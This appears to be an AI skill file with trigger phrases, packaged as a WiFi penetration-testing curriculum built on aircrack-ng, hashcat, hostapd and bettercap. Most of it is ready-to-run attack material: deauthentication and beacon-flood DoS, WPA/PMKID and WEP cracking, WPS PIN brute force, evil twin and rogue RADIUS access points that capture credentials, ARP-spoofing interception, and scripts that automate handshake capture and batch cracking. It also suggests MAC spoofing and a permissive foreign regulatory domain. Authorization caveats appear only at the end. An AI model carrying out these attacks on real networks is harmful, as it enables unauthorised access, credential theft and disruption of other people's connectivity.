---
name: wireless-security-wifi-penetration-testing
description: Hands-on wireless security & WiFi penetration testing curriculum covering 802.11, WEP/WPA/WPA2/WPA3, aircrack-ng suite, and enterprise wireless assessment
triggers:
  - "how do I crack WPA2 handshakes"
  - "set up wireless adapter in monitor mode"
  - "perform WiFi penetration testing"
  - "capture WPA handshake with aircrack-ng"
  - "create evil twin access point"
  - "test wireless network security"
  - "run WiFi deauthentication attack"
  - "analyze 802.11 traffic with wireshark"
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides expertise in wireless security assessment and WiFi penetration testing using the armourinfosec curriculum. It covers 802.11 protocol analysis, WEP/WPA/WPA2/WPA3 exploitation, aircrack-ng suite mastery, enterprise wireless assessment, and rogue access point attacks.

## Project Overview

A comprehensive, lab-driven curriculum for wireless penetration testing that progresses from 802.11 fundamentals through advanced enterprise attacks. The course is structured as 14 modules across 4 phases:

- **Phase 1**: Fundamentals (wireless networks, encryption, adapter setup)
- **Phase 2**: Reconnaissance & bypass (hidden SSIDs, traffic analysis)
- **Phase 3**: Attacks (DoS, WEP/WPA cracking, MITM, rogue APs)
- **Phase 4**: Enterprise (EAP/RADIUS, hardening, reporting)

**Key Technologies**: aircrack-ng, hashcat, kismet, wireshark, hostapd, bettercap, wifiphisher

## Prerequisites & Setup

### Hardware Requirements

```bash
# Required: Injection-capable wireless adapter
# Recommended chipsets:
# - Atheros AR9271 (e.g., Alfa AWUS036NHA)
# - Ralink RT3070/RT5372 (e.g., Alfa AWUS036NH)

# Verify adapter supports monitor mode
sudo airmon-ng

# Test packet injection capability
sudo airmon-ng start wlan0
sudo aireplay-ng --test wlan0mon
```

### Software Installation (Kali Linux)

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install core wireless tools (most pre-installed on Kali)
sudo apt install -y aircrack-ng \
  hashcat \
  hcxdumptool \
  hcxtools \
  reaver \
  bully \
  kismet \
  wireshark \
  hostapd \
  dnsmasq \
  bettercap

# Install additional tools
sudo apt install -y wifiphisher wifipumpkin3

# Verify aircrack-ng installation
aircrack-ng --help
```

### Adapter Configuration

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Creates wlan0mon interface

# Verify monitor mode
iwconfig wlan0mon

# Set regulatory domain (adjust to your country)
sudo iw reg set US

# Change MAC address (optional but recommended)
sudo ifconfig wlan0mon down
sudo macchanger -r wlan0mon
sudo ifconfig wlan0mon up
```

## Wireless Reconnaissance

### Basic Network Discovery

```bash
# Scan all channels and capture beacons/probes
sudo airodump-ng wlan0mon

# Target specific channel and BSSID
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Scan for hidden SSIDs
sudo airodump-ng --band abg wlan0mon

# Use kismet for comprehensive scanning
sudo kismet -c wlan0mon
```

### Advanced Reconnaissance

```bash
# Identify WPS-enabled networks
sudo wash -i wlan0mon

# Capture specific BSSID with filtering
sudo airodump-ng -c 11 \
  --bssid 00:11:22:33:44:55 \
  -w targeted_capture \
  --output-format pcap \
  wlan0mon

# Monitor specific MAC (client tracking)
sudo airodump-ng --bssid 00:11:22:33:44:55 \
  --channel 6 \
  -w client_tracking \
  wlan0mon

# Export to formats for analysis
sudo airodump-ng -w scan --output-format csv,pcap wlan0mon
```

## WPA/WPA2 Handshake Capture & Cracking

### Capture 4-Way Handshake

```bash
# Start capture on target network
sudo airodump-ng -c 6 \
  --bssid AA:BB:CC:DD:EE:FF \
  -w wpa_handshake \
  wlan0mon

# In separate terminal: deauthenticate client to force reconnection
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:HERE \
  wlan0mon

# Verify handshake capture
aircrack-ng wpa_handshake-01.cap
# Look for "1 handshake" message
```

### Crack WPA/WPA2 with Wordlist

```bash
# Using aircrack-ng
aircrack-ng -w /usr/share/wordlists/rockyou.txt \
  -b AA:BB:CC:DD:EE:FF \
  wpa_handshake-01.cap

# Using hashcat (GPU acceleration)
# Convert capture to hashcat format
hcxpcapngtool -o hash.hc22000 wpa_handshake-01.cap

# Crack with hashcat (WPA-PBKDF2-PMKID+EAPOL)
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt

# Use rules for wordlist mutation
hashcat -m 22000 hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked passwords
hashcat -m 22000 hash.hc22000 --show
```

### PMKID Attack (Clientless)

```bash
# Capture PMKID (no client deauth needed)
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid.pcapng

# Crack PMKID
hashcat -m 22000 pmkid.hc22000 /usr/share/wordlists/rockyou.txt
```

## WEP Cracking

### ARP Replay Attack

```bash
# Start capture
sudo airodump-ng -c 6 \
  --bssid AA:BB:CC:DD:EE:FF \
  -w wep_capture \
  wlan0mon

# Fake authentication with AP
sudo aireplay-ng -1 0 \
  -a AA:BB:CC:DD:EE:FF \
  -h YOUR:ADAPTER:MAC \
  wlan0mon

# ARP replay to generate IVs
sudo aireplay-ng -3 \
  -b AA:BB:CC:DD:EE:FF \
  -h YOUR:ADAPTER:MAC \
  wlan0mon

# Crack when sufficient IVs collected (typically 50,000+)
aircrack-ng wep_capture-01.cap
```

### Chop-Chop Attack

```bash
# Interactive packet replay attack
sudo aireplay-ng -4 \
  -b AA:BB:CC:DD:EE:FF \
  -h YOUR:ADAPTER:MAC \
  wlan0mon

# Create ARP packet from XOR file
packetforge-ng -0 \
  -a AA:BB:CC:DD:EE:FF \
  -h YOUR:ADAPTER:MAC \
  -k 255.255.255.255 \
  -l 255.255.255.255 \
  -y replay_dec-*.xor \
  -w arp-packet

# Inject forged packet
sudo aireplay-ng -2 -r arp-packet wlan0mon
```

## Evil Twin & Rogue Access Point Attacks

### Basic Evil Twin (Open Network)

```bash
# Create hostapd configuration
cat > evil_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
EOF

# Start evil twin AP
sudo hostapd evil_twin.conf

# Configure DHCP (separate terminal)
sudo dnsmasq -C /dev/null \
  --dhcp-range=192.168.1.50,192.168.1.150,12h \
  --interface=wlan0 \
  --bind-interfaces
```

### Evil Twin with Credential Capture

```bash
# Using wifiphisher (automated)
sudo wifiphisher -aI wlan0 -e "TargetNetwork" -p firmware-upgrade

# Using wifipumpkin3 (GUI + CLI)
sudo wifipumpkin3
# In interactive shell:
# > set ssid TargetNetwork
# > set interface wlan0
# > proxys
# > start
```

### Advanced MITM with bettercap

```bash
# Create AP and intercept traffic
cat > evil_twin.conf << 'EOF'
interface=wlan0
ssid=CoffeeShopWiFi
channel=6
hw_mode=g
EOF

# Start hostapd
sudo hostapd -B evil_twin.conf

# Configure IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Set up NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Run bettercap for MITM
sudo bettercap -iface wlan0
# In bettercap:
# > set arp.spoof.targets CLIENT_IP
# > arp.spoof on
# > net.sniff on
# > set net.sniff.output /tmp/captured.pcap
```

## Deauthentication & Denial of Service

### Targeted Deauthentication

```bash
# Deauth specific client from AP
sudo aireplay-ng --deauth 0 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:HERE \
  wlan0mon

# Deauth all clients (broadcast)
sudo aireplay-ng --deauth 0 \
  -a AA:BB:CC:DD:EE:FF \
  wlan0mon

# Limited deauth packets (less noisy)
sudo aireplay-ng --deauth 10 \
  -a AA:BB:CC:DD:EE:FF \
  -c CLIENT:MAC:HERE \
  wlan0mon
```

### Using mdk4 for Advanced DoS

```bash
# Beacon flood (creates fake APs)
sudo mdk4 wlan0mon b -f /tmp/ssid_list.txt -a -s 1000

# Authentication DoS
sudo mdk4 wlan0mon a -a AA:BB:CC:DD:EE:FF

# Deauthentication flood
sudo mdk4 wlan0mon d -b /tmp/blacklist.txt
```

## WPS Attacks

### Reaver (PIN Brute Force)

```bash
# Basic WPS attack
sudo reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -vv

# With delay to avoid lockout
sudo reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -d 15 \
  -T 0.5 \
  -vv

# Resume previous session
sudo reaver -i wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -vv \
  -s /tmp/reaver.wpc
```

### Bully (Alternative WPS Tool)

```bash
# WPS attack with bully
sudo bully wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -c 6 \
  -v 3

# Pixie dust attack (faster)
sudo bully wlan0mon \
  -b AA:BB:CC:DD:EE:FF \
  -d \
  -v 3
```

## Enterprise WPA (EAP/RADIUS) Assessment

### Capture EAP Handshakes

```bash
# Capture enterprise authentication
sudo airodump-ng -c 6 \
  --bssid AA:BB:CC:DD:EE:FF \
  -w enterprise_capture \
  wlan0mon

# Convert for hashcat cracking (EAP-MD5)
eapmd5tojohn enterprise_capture-01.cap > eap_hash.john

# Crack with john
john --wordlist=/usr/share/wordlists/rockyou.txt eap_hash.john
```

### Rogue RADIUS Server

```bash
# Configure hostapd-wpe (Wireless Pwnage Edition)
cat > hostapd-wpe.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=Enterprise_Network
channel=6
hw_mode=g
ieee8021x=1
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.pem
dh_file=/etc/hostapd-wpe/dhparam.pem
EOF

# Run rogue RADIUS AP
sudo hostapd-wpe hostapd-wpe.conf

# Captured credentials saved to:
# /var/log/hostapd-wpe.log
```

## Traffic Analysis with Wireshark

### Decrypt WPA2 Traffic with Known PSK

```bash
# Capture traffic with handshake
sudo airodump-ng -c 6 \
  --bssid AA:BB:CC:DD:EE:FF \
  -w decrypt_me \
  wlan0mon

# Open in Wireshark GUI
wireshark decrypt_me-01.cap

# In Wireshark:
# Edit → Preferences → Protocols → IEEE 802.11
# Enable "Enable decryption"
# Edit decryption keys → Add new → wpa-pwd → password:SSID
```

### Command-Line Traffic Analysis

```bash
# Extract specific frame types
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x08" # Beacons
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 0x04" # Probe requests

# Display EAPOL handshakes
tshark -r capture.pcap -Y "eapol"

# Export HTTP traffic (after decryption)
tshark -r capture.pcap -Y "http" -T fields -e http.request.full_uri

# Statistics
tshark -r capture.pcap -q -z io,stat,1
```

## Configuration Files & Common Patterns

### Automated Handshake Capture Script

```bash
#!/bin/bash
# auto_handshake.sh - Automated WPA handshake capture

INTERFACE="wlan0mon"
TARGET_BSSID="$1"
CHANNEL="$2"
OUTPUT_PREFIX="handshake_$(date +%s)"

if [ -z "$TARGET_BSSID" ] || [ -z "$CHANNEL" ]; then
    echo "Usage: $0 <BSSID> <CHANNEL>"
    exit 1
fi

# Start capture in background
sudo airodump-ng -c "$CHANNEL" \
    --bssid "$TARGET_BSSID" \
    -w "$OUTPUT_PREFIX" \
    "$INTERFACE" &
AIRODUMP_PID=$!

# Wait 5 seconds
sleep 5

# Send deauth packets
echo "Sending deauth packets..."
sudo aireplay-ng --deauth 10 \
    -a "$TARGET_BSSID" \
    "$INTERFACE"

# Wait for handshake
sleep 10

# Stop capture
sudo kill $AIRODUMP_PID

# Check for handshake
if aircrack-ng "${OUTPUT_PREFIX}-01.cap" | grep -q "1 handshake"; then
    echo "SUCCESS: Handshake captured in ${OUTPUT_PREFIX}-01.cap"
else
    echo "FAILED: No handshake captured"
    exit 1
fi
```

### Batch WPA Cracking Script

```bash
#!/bin/bash
# batch_crack.sh - Crack multiple captures

WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"
CAPTURES_DIR="$1"

if [ ! -d "$CAPTURES_DIR" ]; then
    echo "Usage: $0 <captures_directory>"
    exit 1
fi

for CAP in "$CAPTURES_DIR"/*.cap; do
    echo "Processing: $CAP"
    
    # Extract BSSID
    BSSID=$(aircrack-ng "$CAP" 2>/dev/null | grep "1 handshake" | awk '{print $2}')
    
    if [ -z "$BSSID" ]; then
        echo "  No handshake found, skipping..."
        continue
    fi
    
    # Crack with aircrack-ng
    aircrack-ng -w "$WORDLIST" -b "$BSSID" "$CAP" | tee "${CAP}.result"
    
    # If failed, try hashcat
    if ! grep -q "KEY FOUND" "${CAP}.result"; then
        echo "  Trying hashcat..."
        hcxpcapngtool -o "${CAP}.hc22000" "$CAP" 2>/dev/null
        if [ -f "${CAP}.hc22000" ]; then
            hashcat -m 22000 "${CAP}.hc22000" "$WORDLIST" --quiet
        fi
    fi
done
```

### Monitor Mode Management

```bash
#!/bin/bash
# monitor_toggle.sh - Toggle monitor mode

INTERFACE="${1:-wlan0}"

if iwconfig "$INTERFACE" 2>/dev/null | grep -q "Mode:Monitor"; then
    echo "Disabling monitor mode..."
    sudo airmon-ng stop "${INTERFACE}mon"
    sudo systemctl restart NetworkManager
    echo "Monitor mode disabled"
else
    echo "Enabling monitor mode..."
    sudo airmon-ng check kill
    sudo airmon-ng start "$INTERFACE"
    echo "Monitor mode enabled on ${INTERFACE}mon"
fi
```

## Troubleshooting

### Adapter Issues

```bash
# Adapter not entering monitor mode
sudo airmon-ng check kill
sudo rfkill unblock all
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Check for firmware issues
dmesg | grep -i firmware
sudo apt install --reinstall linux-firmware

# USB adapter power issues
# Add to /etc/modprobe.d/8xxxu.conf:
# options rtl8xxxu dma_aggregation=0
```

### Injection Testing

```bash
# Test injection capability thoroughly
sudo aireplay-ng --test wlan1mon

# If injection fails, try different channels
for i in {1..11}; do
    echo "Testing channel $i"
    sudo iwconfig wlan0mon channel $i
    sudo aireplay-ng --test wlan0mon
done

# Check regulatory domain
iw reg get

# Force regulatory domain
sudo iw reg set BO  # Bolivia has permissive rules (testing only)
```

### Handshake Capture Issues

```bash
# Verify clients are connected
sudo airodump-ng wlan0mon | grep -A 20 "STATION"

# Increase deauth packet count
sudo aireplay-ng --deauth 100 -a AA:BB:CC:DD:EE:FF wlan0mon

# Use different deauth method (mdk4)
echo "AA:BB:CC:DD:EE:FF" > /tmp/target.txt
sudo mdk4 wlan0mon d -b /tmp/target.txt

# Verify EAPOL packets in capture
tshark -r capture-01.cap -Y "eapol" | wc -l
# Should see 4 packets for complete handshake
```

### Cracking Performance

```bash
# Check hashcat devices
hashcat -I

# Benchmark hash mode
hashcat -b -m 22000

# Use efficient wordlist + rules
hashcat -m 22000 hash.hc22000 \
  --username \
  -w 3 \
  -O \
  /usr/share/wordlists/rockyou.txt \
  -r /usr/share/hashcat/rules/best64.rule

# Resume interrupted session
hashcat --session mysession --restore
```

### Evil Twin Not Working

```bash
# Check for conflicting processes
sudo airmon-ng check kill

# Verify IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Check iptables NAT rules
sudo iptables -t nat -L -n -v

# Test DHCP server
sudo dnsmasq --test

# Increase TX power (if legal)
sudo iwconfig wlan0 txpower 20
```

## Best Practices & Legal Considerations

### Safety Checklist

```bash
# Always verify authorization
# - Written permission for target networks
# - Use only your own lab equipment
# - Isolate RF environment (Faraday cage or low power)

# Regulatory compliance
sudo iw reg set US  # Set correct regulatory domain
iwconfig wlan0mon txpower 15  # Limit transmit power

# Documentation for authorized tests
# - Start/end times
# - Target BSSIDs and channels
# - Tools and techniques used
# - Findings and evidence captured
```

### Lab Isolation

```bash
# Create isolated test network
# - Dedicated router with WEP/WPA/WPA2 SSIDs
# - No connection to internet
# - No other devices in range

# Use RF shielding
# - Faraday cage for adapters
# - RF-shielded room
# - Low power settings

# Monitor for interference
sudo kismet -c wlan0mon --override-dfs
# Check for unexpected networks in range
```

This skill provides comprehensive guidance for wireless penetration testing using industry-standard tools. Always ensure you have explicit written authorization before testing any wireless network, and practice only in controlled lab environments.
